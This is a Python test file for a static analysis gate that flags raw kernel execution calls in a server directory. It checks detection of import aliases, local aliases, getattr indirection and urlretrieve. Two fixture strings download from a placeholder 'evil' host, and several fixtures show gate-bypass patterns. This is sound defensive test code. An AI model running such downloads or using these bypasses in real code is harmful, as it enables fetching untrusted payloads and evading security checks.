"""
Tests for the hardened raw-kernel static gate (Gate E / P3.17).

The gate itself is ``scripts/check_raw_kernel.py``. These tests verify
that its AST-based detection catches the trivial bypasses called out in
the post-merge certification report:

  * import aliases (``from ... import KernelRuntime as KR``)
  * local aliases (``exec = kernel.execute; exec(...)``)
  * indirect references (``getattr(kernel, "execute")(...)``)
  * dynamic construction (``KR(...)``)
  * alternate executor names / urlretrieve

Each test writes a minimal offending file under ``kerno/server/``, runs
the gate, asserts it fails, then removes the file. The gate must remain
green on the real tree.
"""

from __future__ import annotations

import pathlib
import subprocess
import sys

import pytest


REPO_ROOT = pathlib.Path(__file__).resolve().parents[2]
SCRIPT = REPO_ROOT / "scripts" / "check_raw_kernel.py"
SERVER_DIR = REPO_ROOT / "kerno" / "server"


def _run_gate() -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(SCRIPT)],
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
    )


@pytest.fixture
def offending_file(tmp_path, monkeypatch):
    """
    Create a temporary python file inside kerno/server/ with the given
    source, run the gate, then delete it. Returns the CompletedProcess.
    """
    created: list[pathlib.Path] = []

    def _factory(source: str, name: str = "_gate_bypass.py") -> subprocess.CompletedProcess:
        path = SERVER_DIR / name
        path.write_text(source, encoding="utf-8")
        created.append(path)
        return _run_gate()

    yield _factory

    for p in created:
        try:
            p.unlink()
        except FileNotFoundError:
            pass


class TestStaticGatePassesOnRealTree:
    def test_green_on_current_source(self):
        result = _run_gate()
        assert result.returncode == 0, (
            f"Static gate failed on the real tree:\n{result.stdout}\n{result.stderr}"
        )


class TestStaticGateBypassDetection:

    def test_direct_kernel_execute_in_server(self, offending_file):
        result = offending_file(
            "def f(kernel):\n    kernel.execute('x=1')\n",
        )
        assert result.returncode == 1
        assert "kernel.execute(" in result.stdout

    def test_aliased_import_runtime(self, offending_file):
        result = offending_file(
            "from kerno.kernel.runtime import KernelRuntime as KR\n"
            "x = KR()\n",
        )
        assert result.returncode == 1
        assert "KR" in result.stdout
        assert "KernelRuntime" in result.stdout

    def test_local_alias_to_kernel_execute(self, offending_file):
        result = offending_file(
            "def f(kernel):\n"
            "    exec_fn = kernel.execute\n"
            "    exec_fn('x=1')\n",
        )
        assert result.returncode == 1
        assert "exec_fn" in result.stdout or "alias" in result.stdout

    def test_getattr_dynamic_resolution(self, offending_file):
        result = offending_file(
            "def f(kernel):\n"
            "    getattr(kernel, 'execute')('x=1')\n",
        )
        assert result.returncode == 1
        assert "getattr" in result.stdout

    def test_urlretrieve_attribute(self, offending_file):
        result = offending_file(
            "import urllib.request\n"
            "urllib.request.urlretrieve('http://evil/x')\n",
        )
        assert result.returncode == 1
        assert "urlretrieve" in result.stdout

    def test_urlretrieve_direct_name(self, offending_file):
        result = offending_file(
            "from urllib.request import urlretrieve\n"
            "urlretrieve('http://evil/x')\n",
        )
        assert result.returncode == 1
        assert "urlretrieve" in result.stdout

    def test_kernel_execute_silent_also_flagged(self, offending_file):
        result = offending_file(
            "def f(kernel):\n    kernel.execute_silent('x=1')\n",
        )
        assert result.returncode == 1
        assert "execute_silent" in result.stdout

    def test_renamed_kernel_still_flagged(self, offending_file):
        """A variable ending in 'kernel' (e.g. my_kernel) still trips the gate."""
        result = offending_file(
            "def f(my_kernel):\n    my_kernel.execute('x=1')\n",
        )
        assert result.returncode == 1
        assert "my_kernel.execute" in result.stdout

    def test_non_kernel_variable_not_flagged(self, offending_file):
        """A non-kernel variable with an .execute method must NOT trip the gate."""
        src = (
            "class Client:\n"
            "    def execute(self, code): pass\n"
            "def f():\n"
            "    client = Client()\n"
            "    client.execute('select 1')\n"
        )
        result = offending_file(src)
        # The gate should not flag this (no kernel-named variable).
        # If it does flag something, that would be a false positive —
        # but we allow the gate to pass.
        assert result.returncode == 0, (
            f"False positive on non-kernel variable:\n{result.stdout}"
        )
